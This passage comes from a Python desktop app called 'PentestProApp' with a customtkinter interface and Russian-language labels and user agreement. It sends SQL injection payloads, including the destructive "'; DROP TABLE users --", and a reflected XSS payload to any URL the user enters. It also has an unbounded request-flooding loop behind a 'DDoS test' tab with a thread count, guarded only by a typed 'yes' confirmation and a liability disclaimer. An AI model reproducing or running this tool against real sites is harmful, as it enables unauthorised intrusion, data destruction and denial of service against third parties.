            text="Run SQL Test",
            command=self.run_sql_test
        )
        self.sql_test_btn.grid(row=2, column=1, pady=10)

    def create_xss_test_ui(self, parent):
        ctk.CTkLabel(parent, text="Target URL:").grid(row=0, column=0, padx=5, pady=5)
        self.xss_url = ctk.CTkEntry(parent, width=400)  # Исправлено с CCTkEntry на CTkEntry
        self.xss_url.grid(row=0, column=1, padx=5, pady=5)
        
        ctk.CTkLabel(parent, text="Payload:").grid(row=1, column=0, padx=5, pady=5)
        self.xss_payload = ctk.CTkEntry(parent, width=400)
        self.xss_payload.insert(0, "<script>alert('XSS')</script>")
        self.xss_payload.grid(row=1, column=1, padx=5, pady=5)
        
        self.xss_test_btn = ctk.CTkButton(
            parent,
            text="Test XSS",
            command=self.run_xss_test
        )
        self.xss_test_btn.grid(row=2, column=1, pady=10)

    def create_ddos_test_ui(self, parent):
        ctk.CTkLabel(parent, text="Target URL:").grid(row=0, column=0, padx=5, pady=5)
        self.ddos_url = ctk.CTkEntry(parent, width=400)
        self.ddos_url.grid(row=0, column=1, padx=5, pady=5)
        
        ctk.CTkLabel(parent, text="Threads:").grid(row=1, column=0, padx=5, pady=5)
        self.threads = ctk.CTkEntry(parent, width=400)
        self.threads.insert(0, "10")
        self.threads.grid(row=1, column=1, padx=5, pady=5)
        

    def create_settings_tab(self):
        self.settings_frame = ctk.CTkFrame(self.main_area)
        ctk.CTkLabel(self.settings_frame, text="Настройки приложения", font=("Arial", 16)).pack(pady=20)
        
        info = f"""
        Лицензия: Educational Use Only
        
        Разработчик: Pabla Officeal, MihailRis, Sam
        
        Дезайн: Pabla Officeal, MihailRis, Miha Tomatov
        
        CEO: Pabla Officeal, MihailRis, Miha Tomatov, Sam
        
        Code: Pabla Officeal, MihailRis, Sam
        
        Content: Chat GPT, Deepseek ai, Pabla Officeal, Miha Tomatov 
        
        Пользовательское соглашение:
        1. Ответственность разработчика:
           Разработчик данного приложения не несет ответственности за любые убытки, повреждения 
           или последствия, возникающие в результате использования данного приложения пользователем. 
           Пользователь несет полную ответственность за законность своих действий.

        2. Запрещенное использование:
           Пользователь обязуется не использовать приложение для совершения незаконных действий, 
           включая, но не ограничиваясь, атаками на серверы, DDoS, нарушением безопасности чужих 
           информационных систем.

        3. Подтверждение осведомленности:
           Пользователь подтверждает, что осознает риски, связанные с использованием приложения, и берет 
           на себя ответственность за соблюдение всех применимых законов своей юрисдикции.

        4. Отказ от ответственности:
           Приложение предоставляется 'как есть'. Разработчик не дает никаких гарантий, явных или 
           подразумеваемых, относительно работоспособности или безопасности приложения.
           
        
        
        Версия: {self.version}
        """

        textbox = ctk.CTkTextbox(self.settings_frame, wrap='word')
        textbox.pack(fill='both', expand=True)
        textbox.insert('1.0', info)
        textbox.configure(state='disabled')


    def setup_legal_warnings(self):
        self.legal_confirmed = False

    def show_education(self):
        self.hide_all()
        self.education_frame.pack(fill='both', expand=True)

    def show_testing(self):
        self.hide_all()
        self.testing_frame.pack(fill='both', expand=True)

    def show_settings(self):
        self.hide_all()
        self.settings_frame.pack(fill='both', expand=True)

    def hide_all(self):
        for frame in [self.education_frame, self.testing_frame, self.settings_frame]:
            frame.pack_forget()


    def run_sql_test(self):
        if not self.check_legal():
            return
        
        url = self.sql_url.get()
        params = self.sql_params.get().split(',')
        
        payloads = [
            "' OR 1=1 --",
            "'; DROP TABLE users --",
            "UNION SELECT NULL,@@version"
        ]
        
        for payload in payloads:
            try:
                data = {param: payload for param in params}
                response = requests.get(url, params=data)
                self.log(f"Testing payload: {payload}")
                self.log(f"Status Code: {response.status_code}")
                
                if "error" in response.text.lower():
                    self.log("[VULNERABLE] Possible SQLi detected!")
                
            except Exception as e:
                self.log(f"Error: {str(e)}")

    def run_xss_test(self):
        if not self.check_legal():
            return
        
        url = self.xss_url.get()
        payload = self.xss_payload.get()
        
        try:
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                self.log("[XSS DETECTED] Payload reflected!")
            else:
                self.log("[SAFE] No reflection detected")
        except Exception as e:
            self.log(f"Error: {str(e)}")

    def send_requests(self, url):
        try:
            while True:
                requests.get(url)
                self.log(f"Request sent to {url}")
                time.sleep(0.1)
        except Exception as e:
            self.log(f"Error: {str(e)}")

    def check_legal(self):
        if not self.legal_confirmed:
            dialog = ctk.CTkInputDialog(
                text="Подтвердите что имеете право на тестирование:",
                title="Юридическое подтверждение"
            )
            confirm = dialog.get_input()
            if confirm.lower() != "yes":
                self.log("Тестирование отменено")
                return False
            self.legal_confirmed = True
        return True

    def log(self, message):
        self.console.insert('end', f"{message}\n")
        self.console.see('end')

if __name__ == "__main__":
    app = PentestProApp()
    app.mainloop()